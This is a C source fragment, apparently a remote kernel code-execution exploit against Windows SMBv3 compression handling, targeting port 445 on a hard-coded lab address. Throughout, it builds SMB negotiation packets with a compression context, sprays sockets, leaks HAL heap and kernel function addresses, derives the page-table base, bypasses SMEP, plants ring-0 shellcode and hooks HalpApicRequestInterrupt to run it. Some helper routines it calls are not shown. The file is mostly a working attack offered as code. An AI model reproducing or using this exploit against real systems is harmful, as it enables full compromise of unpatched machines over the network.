			printf("socket() failed with error: %d\n", WSAGetLastError());

			return EXIT_FAILURE;
		}

		sockaddr_in client;
		client.sin_family = AF_INET;
		client.sin_port = htons(445);
		InetPton(AF_INET, "192.168.67.3", &client.sin_addr);

		setsockopt(Sock_List3[IC], SOL_SOCKET, SO_RCVTIMEO, (char*)&iTimeOut, sizeof(iTimeOut));
		setsockopt(Sock_List3[IC], SOL_SOCKET, SO_SNDTIMEO, (char*)&iTimeOut, sizeof(iTimeOut));


		if (connect(Sock_List3[IC], (sockaddr*)&client, sizeof(client)) == SOCKET_ERROR) {
			return error_exit(Sock_List3[IC], "connect()");
		}

	}

	return 0;
}


int send_negotiation(SOCKET sock, UINT Flags) {
	int err = 0;
	char response[0x1000] = { 0 };

	memset(response, 0x00, 0x1000);

	const uint8_t buf[] = {
		/* NetBIOS Wrapper */
		0x00,                   /* session */
		0x00, 0x00, 0xC4,       /* length */// 0xC4

		/* SMB Header */
		0xFE, 0x53, 0x4D, 0x42, /* protocol id */
		0x40, 0x00,             /* structure size, must be 0x40 */
		0x00, 0x00,             /* credit charge */
		0x00, 0x00,             /* channel sequence */
		0x00, 0x00,             /* channel reserved */
		0x00, 0x00,             /* command */
		0x00, 0x00,             /* credits requested */
		0x00, 0x00, 0x00, 0x00, /* flags */
		0x00, 0x00, 0x00, 0x00, /* chain offset */
		0x00, 0x00, 0x00, 0x00, /* message id */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, /* reserved */
		0x00, 0x00, 0x00, 0x00, /* tree id */
		0x00, 0x00, 0x00, 0x00, /* session id */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00, /* signature */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,

		/* SMB Negotiation Request */
		0x24, 0x00,             /* structure size */
		0x08, 0x00,             /* dialect count, 8 */
		0x00, 0x00,             /* security mode */
		0x00, 0x00,             /* reserved */
		0x7F, 0x00, 0x00, 0x00, /* capabilities */
		0x01, 0x02, 0xAB, 0xCD, /* guid */
		0x01, 0x02, 0xAB, 0xCD,
		0x01, 0x02, 0xAB, 0xCD,
		0x01, 0x02, 0xAB, 0xCD,
		0x78, 0x00,             /* negotiate context */
		0x00, 0x00,             /* additional padding */
		0x02, 0x00,             /* negotiate context count */
		0x00, 0x00,             /* reserved 2 */
		0x02, 0x02,             /* dialects, SMB 2.0.2 */
		0x10, 0x02,             /* SMB 2.1 */
		0x22, 0x02,             /* SMB 2.2.2 */
		0x24, 0x02,             /* SMB 2.2.3 */
		0x00, 0x03,             /* SMB 3.0 */
		0x02, 0x03,             /* SMB 3.0.2 */
		0x10, 0x03,             /* SMB 3.0.1 */
		0x11, 0x03,             /* SMB 3.1.1 */
		0x00, 0x00, 0x00, 0x00, /* padding */

		/* Preauth context */
		0x01, 0x00,             /* type */
		0x26, 0x00,             /* length */
		0x00, 0x00, 0x00, 0x00, /* reserved */
		0x01, 0x00,             /* hash algorithm count */
		0x20, 0x00,             /* salt length */
		0x01, 0x00,             /* hash algorith, SHA512 */
		0x00, 0x00, 0x00, 0x00, /* salt */
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00, 0x00, 0x00,
		0x00, 0x00,             /* pad */

		/* Compression context */
		0x03, 0x00,             /* type */
		0x0E, 0x00,             /* length */
		0x00, 0x00, 0x00, 0x00, /* reserved */
		0x02, 0x00,             /* compression algorithm count */
		0x00, 0x00,             /* padding */
		0x01, 0x00, 0x00, 0x00, /* flags */
		0x02, 0x00,             /* LZ77 */
		0x03, 0x00,             /* LZ77+Huffman */
		0x00, 0x00, 0x00, 0x00, /* padding */
		0x00, 0x00, 0x00, 0x00
	};

	UCHAR* Buffer = (UCHAR*)malloc(sizeof(buf) + 0xF0);

	memcpy(Buffer, buf, sizeof(buf));

	UINT Offsets = NULL;

	ULONG64 GetDatas = NULL;

	if ((err = send(sock, (const char*)Buffer, sizeof(buf), 0)) != SOCKET_ERROR) {
		recv(sock, response, sizeof(response), 0);
		switch (Flags) {

		case 1:
			// Hal HEAP HalpApicRequestInterrupt_OffSet

			HalHeapBase = *(ULONG64*)(response + 0x84) - 0xF8;

			P_HalpApicRequestInterrupt_OffSet = HalHeapBase + 0x5B8;

			break;
		case 2:
			// HalpApicRequestInterrupt 
			HalpApicRequestInterrupt = *(ULONG64*)(response + 0x78);
			HalpApicStartProcessor = *(ULONG64*)(response + 0x80);

			FK_HalpApicRequestInterrupt = *(ULONG64*)(response + 0x7C);
			FK_HalpApicStartProcessor = *(ULONG64*)(response + 0x84);
			break;
		case 3: 
			// 0x80000000001aa063 Find_Case
			Find_Case += 0x40;
			GetDatas = (ULONG64)response;
			//
			while (Offsets * 8 <= 0x800) {
				if (*((ULONG64*)GetDatas + Offsets) == 0x80000000001aa063) {
					Paged_Flags = 1;
					Paged_Offset = Offsets + Find_Case;
					printf("\nOne\n");
					break;
				}
				Offsets++;
			}

			if (Paged_Flags == 1) {
				break;
			}
			Offsets = 0x00;
			GetDatas += 4;
			while (Offsets * 8 <= 0x800) {
				if (*((ULONG64*)GetDatas + Offsets) == 0x80000000001aa063) {
					Paged_Flags = 1;
					Paged_Offset = Offsets + Find_Case;
					printf("\nTwo\n");
					HalpApicRequestInterrupt = FK_HalpApicRequestInterrupt;
					HalpApicStartProcessor = FK_HalpApicStartProcessor;

					break;
				}
				Offsets++;
			}
			break;

		}

	}

	return err;
}




int main(int argc, char* argv[]) {


	WORD wVersionRequested = MAKEWORD(2, 2);
	WSADATA wsaData = { 0 };
	SOCKET sock = INVALID_SOCKET;
	uint64_t ktoken = 0;

	int err = 0;


	if ((err = WSAStartup(wVersionRequested, &wsaData)) != 0) {
		printf("WSAStartup() failed with error: %d\n", err);
		return EXIT_FAILURE;
	}

	if (LOBYTE(wsaData.wVersion) != 2 || HIBYTE(wsaData.wVersion) != 2) {
		printf("Couldn't find a usable version of Winsock.dll\n");
		WSACleanup();
		return EXIT_FAILURE;
	}

	sock = socket(AF_INET, SOCK_STREAM, IPPROTO_TCP);
	if (sock == INVALID_SOCKET) {
		printf("socket() failed with error: %d\n", WSAGetLastError());
		WSACleanup();
		return EXIT_FAILURE;
	}

	sockaddr_in client;
	client.sin_family = AF_INET;
	client.sin_port = htons(445);
	InetPton(AF_INET, "192.168.67.3", &client.sin_addr);

	if (connect(sock, (sockaddr*)&client, sizeof(client)) == SOCKET_ERROR) {
		return error_exit(sock, "connect()");
	}


	printf("Successfully connected socket descriptor: %d\n", (int)sock);
	//printf("Sending SMB negotiation request...\n");

	Init_SockList();


	if (send_negotiation(sock,0) == SOCKET_ERROR) {
		printf("Couldn't finish SMB negotiation\n");
		return error_exit(sock, "send()");
	}


	send_compressed_Set_MDL(sock,0x50,0x01);

	send_compressed_FUCK_MDL(sock);


	for (UINT IC = 0; IC < 0x1F;IC++) {
		send_negotiation(Sock_List[IC],0);
		send_compressed_FUCK_MDL(Sock_List[IC]);
	}
	//Get HAL Heap Base Init RCE EXPLoit
	//Init_Rce_EXPLoit(Sock_List[0x1F]);
	send_negotiation(Sock_List[0x1F], 1);



	
	for (UINT IC = 0x20; IC < 0x3F; IC++) {
		send_negotiation(Sock_List[IC], 0);
		send_compressed_Set_MDL(Sock_List[IC], 0x540, 0x01);
	}


	for (UINT IC = 0x00; IC < 0x4F; IC++) {
		send_negotiation(Sock_List2[IC], 0);
		send_compressed_FUCK_MDL(Sock_List2[IC]);
	}
	send_negotiation(Sock_List2[0x4F], 2);


	/*
	for (UINT IC = 0x50 ; IC < 0x6F; IC++) {
		send_negotiation(Sock_List[IC], 0);
		//__debugbreak();
		send_compressed_Set_MDL(Sock_List[IC], PagedRead_Of, 0x1aa);
		printf("IC:0x%p\n", IC);
	}

	*/

	//__debugbreak();

	//__debugbreak();  FFFFF78000000000

	PagedRead_Of = 0x200;
	
	while (Paged_Flags == 0) {

		for (; PagedRead_Of <= 0x1200;) {
			for (UINT IC = 0x60 + OF; IC < 0x7F + OF; IC++) {
				//Sleep(0x200);
				send_negotiation(Sock_List[IC + OF], 0);
				//Sleep(0x100);
				send_compressed_Set_MDL(Sock_List[IC + OF], PagedRead_Of, 0x1aa);
				//printf("IC:0x%p\n", IC);
			}
			for (UINT IC = 0x50 + OF; IC < 0x6F + OF; IC++) {
				//Sleep(0x100);
				send_negotiation(Sock_List2[IC + OF], 0);
				send_compressed_FUCK_MDL(Sock_List2[IC+ OF]);
			}
			//printf("OF:0x%p\n", OF);
			send_negotiation(Sock_List[0x7F + OF], 3);
			PagedRead_Of += 0x200;
			OF += 0x20;
			if (Paged_Flags == 1)
				break;
		}
	}


	if (HalHeapBase < 0xFFFFF00000000000) {
		printf("HalHeapBase Get Error\n");
		exit(1);
	}


	if (HalpApicRequestInterrupt < 0xFFFFF00000000000) {
		printf("HalpApicRequestInterrupt Get Error\n");
		exit(1);
	}

	printf("Sizeof(ShellCode_All):0x%p\n", sizeof(rin0_ShellCode));

	printf("\nHalHeapBase : 0x%p\n", HalHeapBase);
	printf("HalpApicStartProcessor : 0x%p\n", HalpApicStartProcessor);
	printf("HalpApicRequestInterrupt : 0x%p\n", HalpApicRequestInterrupt);
	printf("P_HalpApicRequestInterrupt_OffSet : 0x%p\n", P_HalpApicRequestInterrupt_OffSet);

	printf("Paged_Offset : 0x%p\n", Paged_Offset);

	if (Paged_Offset < 0x100 || Paged_Offset > 0x200) {
		printf("Paged_Offset Get Error\n");
		exit(1);
	}

	PTE_Base = (Paged_Offset << 0x27) | 0xFFFF000000000000;

	printf("PTE_Base : 0x%p\n", PTE_Base);

	KUSER_SHARED_DATA_PTE_Address = ((KUSER_SHARED_DATA >> 9) & 0x7FFFFFFFF8) + PTE_Base;

	printf("KUSER_SHARED_DATA_PTE_Address : 0x%p\n", KUSER_SHARED_DATA_PTE_Address);




	send_negotiation(Sock_List3[0x00], 0);
	send_compressed_ByPass_SMEP(Sock_List3[0x00]);

	printf("ByPass SMEP OK!\n");



	send_negotiation(Sock_List3[0x01], 0);
	send_compressed_SetG(Sock_List3[0x01]);

	printf("Set Global Var Ok!\n");







	send_negotiation(Sock_List3[0x02], 0);
	send_compressed_SetShellCode(Sock_List3[0x02]);


	printf("Set ShellCode Ok!\n");

	//__debugbreak();



	send_negotiation(Sock_List3[0x03], 0);
	send_compressed_SetHalpApicRequestInterrupt(Sock_List3[0x03]);

	printf("Hook HalpApicRequestInterrupt OK!\n");


	getchar();
	getchar();
	getchar();
	getchar();

	WSACleanup();
	return EXIT_SUCCESS;
}

